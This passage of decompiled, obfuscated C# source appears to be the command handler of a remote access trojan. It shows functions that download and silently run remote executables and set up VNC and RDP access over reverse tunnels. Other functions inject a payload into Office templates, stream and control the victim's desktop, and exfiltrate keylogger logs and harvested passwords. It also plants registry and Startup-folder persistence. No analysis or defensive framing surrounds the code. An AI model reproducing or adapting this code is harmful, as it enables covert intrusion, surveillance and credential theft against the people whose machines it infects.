		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			string fileName = Path.GetFileName(Path.GetDirectoryName(command.Path));
			if (command.PathType == GEnum4.const_1)
			{
				string path = command.Path;
				string destinationArchiveFileName = Path.Combine(command.Path, fileName + "-{DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffffff}.zip");
				ZipFile.CreateFromDirectory(path, destinationArchiveFileName, CompressionLevel.Fastest, includeBaseDirectory: true);
				new SetStatusFileManager("Zip directory", setLastDirectorySeen: false).Execute(client);
			}
			smethod_7(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("File Zip No permission");
		}
		catch (PathTooLongException)
		{
			action("File Zip Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("File Zip Path not found");
		}
		catch (IOException)
		{
			action("File Zip I/O error");
		}
		catch (Exception)
		{
			action("File Zip Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_14(DoPathRename command, GClass13 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case GEnum4.const_1:
				Directory.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed directory", setLastDirectorySeen: false).Execute(client);
				break;
			case GEnum4.const_0:
				File.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			smethod_7(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("RenamePath No permission");
		}
		catch (PathTooLongException)
		{
			action("RenamePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("RenamePath Path not found");
		}
		catch (IOException)
		{
			action("RenamePath I/O error");
		}
		catch (Exception)
		{
			action("RenamePath Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_15(DDAndE command, GClass13 client)
	{
		new SetStatus("Downloading file...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			string text = GClass47.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.URL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Downloaded File!").Execute(client);
			try
			{
				GClass47.smethod_3(text);
				if (!GClass47.smethod_2(File.ReadAllBytes(text)))
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
			}
			catch
			{
				GClass8.DeleteFile(text);
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Executed File!").Execute(client);
		}).Start();
	}

	public static void smethod_16(DoIVN command, GClass13 client)
	{
		new SetStatus("Installing VNC...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			string token = "";
			try
			{
				Task.Run((Action)GClass52.smethod_9).Wait();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Vnc Installed on Target!").Execute(client);
			try
			{
				GClass52.smethod_52(token, "5901");
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Activated Reverse Tcp,Vnc Login now!").Execute(client);
		}).Start();
	}

	public static void smethod_17(DoIDP command, GClass13 client)
	{
		new SetStatus("Installing RDP...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			string token = "";
			try
			{
				Task.Run((Action)GClass52.smethod_15).Wait();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Rdp Installed on Target!").Execute(client);
			try
			{
				GClass52.smethod_52(token, "3389");
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Activating ReverseTcp,Rdp Login now!").Execute(client);
		}).Start();
	}

	public static void smethod_18(DoUAndE command, GClass13 client)
	{
		if (!dictionary_0.ContainsKey(command.ID))
		{
			dictionary_0.Add(command.ID, GClass47.smethod_1(Path.GetExtension(command.FileName)));
		}
		string text = dictionary_0[command.ID];
		try
		{
			if (command.CurrentBlock == 0 && Path.GetExtension(text) == ".exe" && !GClass47.smethod_2(command.Block))
			{
				throw new Exception("No executable file");
			}
			GClass6 gClass = new GClass6(text);
			if (!gClass.method_2(command.Block, command.CurrentBlock))
			{
				throw new Exception(gClass.LastError);
			}
			if (command.CurrentBlock + 1 == command.MaxBlocks)
			{
				if (dictionary_0.ContainsKey(command.ID))
				{
					dictionary_0.Remove(command.ID);
				}
				GClass47.smethod_3(text);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
				new SetStatus("Executed File!").Execute(client);
			}
		}
		catch (Exception ex)
		{
			if (dictionary_0.ContainsKey(command.ID))
			{
				dictionary_0.Remove(command.ID);
			}
			GClass8.DeleteFile(text);
			new SetStatus("Execution failed: " + ex.Message).Execute(client);
		}
	}

	public static void smethod_19(InstallTunnel command, GClass13 client)
	{
		new SetStatus("Check if a tunnel exist and kill it...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			try
			{
				Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
				GClass52.smethod_80();
				GClass52.smethod_85();
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Killed open tunnel!").Execute(client);
		}).Start();
		new SetStatus("Starting Reverce Connection...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			try
			{
				string pOKEN = command.POKEN;
				string pORT = command.PORT;
				string pROTO = command.PROTO;
				GClass52.smethod_53(pOKEN, pORT, pROTO);
			}
			catch
			{
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Reverce Connection Activated!").Execute(client);
		}).Start();
	}

	public static void smethod_20(DoVisit command, GClass13 client)
	{
		string text = command.URL;
		if (!text.StartsWith("http"))
		{
			text = "http://" + text;
		}
		if (!Uri.IsWellFormedUriString(text, UriKind.RelativeOrAbsolute))
		{
			return;
		}
		if (!command.Hidden)
		{
			Process.Start(text);
		}
		else
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(text);
				obj.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
				obj.AllowAutoRedirect = true;
				obj.Timeout = 10000;
				obj.Method = "GET";
				using ((HttpWebResponse)obj.GetResponse())
				{
				}
			}
			catch
			{
			}
		}
		new SetStatus("Visited Website").Execute(client);
	}

	public static void smethod_21(DoInjOffice command, GClass13 client)
	{
		new SetStatus("Injecting office....").Execute(client);
		new Thread((ThreadStart)delegate
		{
			try
			{
				new SetStatus("Injecting Default Template....").Execute(client);
				Task.Run(delegate
				{
					GClass52.smethod_107(command.URL, command.Name);
				}).Wait();
			}
			catch
			{
			}
			new SetStatus("Office Injected with Venom....").Execute(client);
		}).Start();
	}

	public static void smethod_22(DoShowMessageBox command, GClass13 client)
	{
		new Thread((ThreadStart)delegate
		{
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show(command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
		}).Start();
		new SetStatus("Showed Messagebox").Execute(client);
	}

	public static void smethod_23(DoLoadRegistryKey packet, GClass13 client)
	{
		GetRegistryKeysResponse getRegistryKeysResponse = new GetRegistryKeysResponse();
		try
		{
			RegistrySeeker registrySeeker = new RegistrySeeker();
			registrySeeker.BeginSeeking(packet.RootKeyName);
			getRegistryKeysResponse.Matches = registrySeeker.Matches;
			getRegistryKeysResponse.IsError = false;
		}
		catch (Exception ex)
		{
			getRegistryKeysResponse.IsError = true;
			getRegistryKeysResponse.ErrorMsg = ex.Message;
		}
		getRegistryKeysResponse.RootKey = packet.RootKeyName;
		getRegistryKeysResponse.Execute(client);
	}

	public static void smethod_24(DoCreateRegistryKey packet, GClass13 client)
	{
		GetCreateRegistryKeyResponse getCreateRegistryKeyResponse = new GetCreateRegistryKeyResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryKeyResponse.ErrorMsg = errorMsg;
		getCreateRegistryKeyResponse.Match = new RegSeekerMatch(name, GClass59.smethod_5(), 0);
		getCreateRegistryKeyResponse.ParentPath = packet.ParentPath;
		getCreateRegistryKeyResponse.Execute(client);
	}

	public static void smethod_25(DoDeleteRegistryKey packet, GClass13 client)
	{
		GetDeleteRegistryKeyResponse getDeleteRegistryKeyResponse = new GetDeleteRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryKeyResponse.ErrorMsg = errorMsg;
		getDeleteRegistryKeyResponse.ParentPath = packet.ParentPath;
		getDeleteRegistryKeyResponse.KeyName = packet.KeyName;
		getDeleteRegistryKeyResponse.Execute(client);
	}

	public static void smethod_26(DoRenameRegistryKey packet, GClass13 client)
	{
		GetRenameRegistryKeyResponse getRenameRegistryKeyResponse = new GetRenameRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryKeyResponse.ErrorMsg = errorMsg;
		getRenameRegistryKeyResponse.ParentPath = packet.ParentPath;
		getRenameRegistryKeyResponse.OldKeyName = packet.OldKeyName;
		getRenameRegistryKeyResponse.NewKeyName = packet.NewKeyName;
		getRenameRegistryKeyResponse.Execute(client);
	}

	public static void smethod_27(DoCreateRegistryValue packet, GClass13 client)
	{
		GetCreateRegistryValueResponse getCreateRegistryValueResponse = new GetCreateRegistryValueResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryValueResponse.ErrorMsg = errorMsg;
		getCreateRegistryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
		getCreateRegistryValueResponse.KeyPath = packet.KeyPath;
		getCreateRegistryValueResponse.Execute(client);
	}

	public static void smethod_28(DoDeleteRegistryValue packet, GClass13 client)
	{
		GetDeleteRegistryValueResponse getDeleteRegistryValueResponse = new GetDeleteRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryValueResponse.ErrorMsg = errorMsg;
		getDeleteRegistryValueResponse.ValueName = packet.ValueName;
		getDeleteRegistryValueResponse.KeyPath = packet.KeyPath;
		getDeleteRegistryValueResponse.Execute(client);
	}

	public static void smethod_29(DoRenameRegistryValue packet, GClass13 client)
	{
		GetRenameRegistryValueResponse getRenameRegistryValueResponse = new GetRenameRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryValueResponse.ErrorMsg = errorMsg;
		getRenameRegistryValueResponse.KeyPath = packet.KeyPath;
		getRenameRegistryValueResponse.OldValueName = packet.OldValueName;
		getRenameRegistryValueResponse.NewValueName = packet.NewValueName;
		getRenameRegistryValueResponse.Execute(client);
	}

	public static void smethod_30(DoChangeReg packet, GClass13 client)
	{
		GetChangeRegistryValueResponse getChangeRegistryValueResponse = new GetChangeRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getChangeRegistryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getChangeRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getChangeRegistryValueResponse.ErrorMsg = errorMsg;
		getChangeRegistryValueResponse.KeyPath = packet.KeyPath;
		getChangeRegistryValueResponse.Value = packet.Value;
		getChangeRegistryValueResponse.Execute(client);
	}

	public static void smethod_31(GetPw packet, GClass13 client)
	{
		List<GClass72> list = new List<GClass72>();
		List<string> list2 = new List<string>();
		for (int i = 0; i < list.Count; i++)
		{
			GClass72 gClass = list[i];
			string item = string.Format(gClass.Username + "$E$" + gClass.Password + "$E$" + gClass.URL + "$E$" + gClass.Application);
			list2.Add(item);
		}
		new GetPResp(list2).Execute(client);
	}

	public static void smethod_32(GetDesktop command, GClass13 client)
	{
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		string text = GClass48.smethod_2(GClass62.smethod_1(command.Monitor));
		if (unsafeStreamCodec_0 == null)
		{
			unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		if (unsafeStreamCodec_0.ImageQuality != command.Quality || unsafeStreamCodec_0.Monitor != command.Monitor || unsafeStreamCodec_0.Resolution != text)
		{
			unsafeStreamCodec_0?.Dispose();
			unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		BitmapData val = null;
		Bitmap val2 = null;
		try
		{
			val2 = GClass62.smethod_0(command.Monitor);
			val = val2.LockBits(new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), (ImageLockMode)3, ((Image)val2).get_PixelFormat());
			using MemoryStream memoryStream = new MemoryStream();
			if (unsafeStreamCodec_0 == null)
			{
				throw new Exception("StreamCodec can not be null.");
			}
			unsafeStreamCodec_0.CodeImage(val.get_Scan0(), new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), new Size(((Image)val2).get_Width(), ((Image)val2).get_Height()), ((Image)val2).get_PixelFormat(), memoryStream);
			new GetDesktopResponse(memoryStream.ToArray(), unsafeStreamCodec_0.ImageQuality, unsafeStreamCodec_0.Monitor, unsafeStreamCodec_0.Resolution).Execute(client);
		}
		catch (Exception)
		{
			if (unsafeStreamCodec_0 != null)
			{
				new GetDesktopResponse(null, unsafeStreamCodec_0.ImageQuality, unsafeStreamCodec_0.Monitor, unsafeStreamCodec_0.Resolution).Execute(client);
			}
			unsafeStreamCodec_0 = null;
		}
		finally
		{
			if (val2 != null)
			{
				if (val != null)
				{
					try
					{
						val2.UnlockBits(val);
					}
					catch
					{
					}
				}
				((Image)val2).Dispose();
			}
		}
	}

	public static void smethod_33(DoMouseEvent command, GClass13 client)
	{
		try
		{
			Screen[] allScreens = Screen.get_AllScreens();
			int x = allScreens[command.MonitorIndex].get_Bounds().X;
			int y = allScreens[command.MonitorIndex].get_Bounds().Y;
			Point p = new Point(command.X + x, command.Y + y);
			GEnum3 action = command.Action;
			if ((uint)action <= 4u && GClass55.smethod_6())
			{
				GClass55.smethod_7();
			}
			switch (command.Action)
			{
			case GEnum3.const_0:
			case GEnum3.const_1:
				GClass55.smethod_1(p, command.IsMouseDown);
				break;
			case GEnum3.const_2:
			case GEnum3.const_3:
				GClass55.smethod_2(p, command.IsMouseDown);
				break;
			case GEnum3.const_4:
				GClass55.smethod_3(p);
				break;
			case GEnum3.const_5:
				GClass55.smethod_4(p, scrollDown: false);
				break;
			case GEnum3.const_6:
				GClass55.smethod_4(p, scrollDown: true);
				break;
			}
		}
		catch
		{
		}
	}

	public static void smethod_34(DoKeyboardEvent command, GClass13 client)
	{
		if (GClass55.smethod_6())
		{
			GClass55.smethod_7();
		}
		GClass55.smethod_5(command.Key, command.KeyDown);
	}

	public static void smethod_35(GetMonitors command, GClass13 client)
	{
		if (Screen.get_AllScreens().Length != 0)
		{
			new GetMonitorsResponse(Screen.get_AllScreens().Length).Execute(client);
		}
	}

	public static void smethod_36(GetKeylover command, GClass13 client)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				int num = 1;
				if (!Directory.Exists(Klover.LogDirectory))
				{
					new GetKeyResp("", new byte[0], -1, -1, "", num, 0).Execute(client);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(Klover.LogDirectory).GetFiles();
					if (files.Length == 0)
					{
						new GetKeyResp("", new byte[0], -1, -1, "", num, 0).Execute(client);
					}
					else
					{
						FileInfo[] array = files;
						foreach (FileInfo fileInfo in array)
						{
							GClass6 gClass = new GClass6(fileInfo.FullName);
							if (gClass.MaxBlocks < 0)
							{
								new GetKeyResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
							}
							for (int j = 0; j < gClass.MaxBlocks; j++)
							{
								if (gClass.method_1(j, out var readBytes))
								{
									new GetKeyResp(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(client);
								}
								else
								{
									new GetKeyResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetKeyResp("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
			}
		}).Start();
	}

	public static void smethod_37(GetAllPw command, GClass13 client)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				int num = 1;
				Directory.Exists(PassDirectory);
				if (!Directory.Exists(PassDirectory))
				{
					new GetDPResp("", new byte[0], -1, -1, "", num, 0).Execute(client);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(PassDirectory).GetFiles();
					if (files.Length == 0)
					{
						new GetDPResp("", new byte[0], -1, -1, "", num, 0).Execute(client);
					}
					else
					{
						FileInfo[] array = files;
						foreach (FileInfo fileInfo in array)
						{
							GClass6 gClass = new GClass6(fileInfo.FullName);
							if (gClass.MaxBlocks < 0)
							{
								new GetDPResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
							}
							for (int j = 0; j < gClass.MaxBlocks; j++)
							{
								if (gClass.method_1(j, out var readBytes))
								{
									new GetDPResp(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(client);
								}
								else
								{
									new GetDPResp("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetDPResp("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
			}
		}).Start();
	}

	public static void smethod_38(GetAEvilE command, GClass13 client)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				if (!File.Exists(string_3))
				{
					GClass52.smethod_33();
				}
				int num = 1;
				if (!Directory.Exists(dkPassDirectory))
				{
					new GetAllEvilEyeResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(dkPassDirectory).GetFiles();
					if (files.Length == 0)
					{
						new GetAllEvilEyeResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
					}
					else
					{
						FileInfo[] array = files;
						foreach (FileInfo fileInfo in array)
						{
							GClass6 gClass = new GClass6(fileInfo.FullName);
							if (gClass.MaxBlocks < 0)
							{
								new GetAllEvilEyeResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
							}
							for (int j = 0; j < gClass.MaxBlocks; j++)
							{
								if (gClass.method_1(j, out var readBytes))
								{
									new GetAllEvilEyeResponse(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(client);
								}
								else
								{
									new GetAllEvilEyeResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetAllEvilEyeResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
			}
		}).Start();
	}

	public static void smethod_39(GetDrives command, GClass13 client)
	{
		DriveInfo[] array;
		try
		{
			array = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).ToArray();
		}
		catch (IOException)
		{
			new SetStatusFileManager("GetDrives I/O error", setLastDirectorySeen: false).Execute(client);
			return;
		}
		catch (UnauthorizedAccessException)
		{
			new SetStatusFileManager("GetDrives No permission", setLastDirectorySeen: false).Execute(client);
			return;
		}
		if (array.Length == 0)
		{
			new SetStatusFileManager("GetDrives No drives", setLastDirectorySeen: false).Execute(client);
			return;
		}
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			string text = null;
			try
			{
				text = array[i].VolumeLabel;
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text))
			{
				array2[i] = $"{array[i].RootDirectory.FullName} [{GClass48.smethod_1(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			else
			{
				array2[i] = $"{array[i].RootDirectory.FullName} ({text}) [{GClass48.smethod_1(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			array3[i] = array[i].RootDirectory.FullName;
		}
		new GetDrivesResponse(array2, array3).Execute(client);
	}

	public static void smethod_40(DoShutdownAction command, GClass13 client)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			switch (command.Action)
			{
			case GEnum5.const_0:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/s /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum5.const_1:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/r /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum5.const_2:
				Application.SetSuspendState((PowerState)0, true, true);
				break;
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Action failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_41(GetStartupItems command, GClass13 client)
	{
		try
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = GClass59.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey != null)
				{
					list.AddRange(from formattedKeyValue in registryKey.GetFormattedKeyValues()
						select "0" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey2 = GClass59.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey2 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey2.GetFormattedKeyValues()
						select "1" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey3 = GClass59.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey3 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey3.GetFormattedKeyValues()
						select "2" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey4 = GClass59.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey4 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey4.GetFormattedKeyValues()
						select "3" + formattedKeyValue);
				}
			}
			if (GClass56.Is64Bit)
			{
				using (RegistryKey registryKey5 = GClass59.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (registryKey5 != null)
					{
						list.AddRange(from formattedKeyValue in registryKey5.GetFormattedKeyValues()
							select "4" + formattedKeyValue);
					}
				}
				using RegistryKey registryKey6 = GClass59.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
				if (registryKey6 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey6.GetFormattedKeyValues()
						select "5" + formattedKeyValue);
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
				list.AddRange(from file in files
					where file.Name != "desktop.ini"
					select $"{file.Name}||{file.FullName}" into formattedKeyValue
					select "6" + formattedKeyValue);
			}
			new GetStartupItemsResponse(list).Execute(client);
		}
		catch (Exception ex)
		{
			new SetStatus($"Getting Autostart Items failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_42(DoStartA command, GClass13 client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass59.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 1:
				if (!GClass59.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 2:
				if (!GClass59.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 3:
				if (!GClass59.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 4:
				if (!GClass56.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass59.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 5:
				if (!GClass56.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass59.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 6:
			{
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				}
				using StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), append: false);
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + command.Path);
				streamWriter.WriteLine("IconIndex=0");
				streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
				streamWriter.Flush();
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Adding Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_43(DoStartR command, GClass13 client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass59.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 1:
				if (!GClass59.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 2:
				if (!GClass59.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 3:
				if (!GClass59.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 4:
				if (!GClass56.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass59.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 5:
				if (!GClass56.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
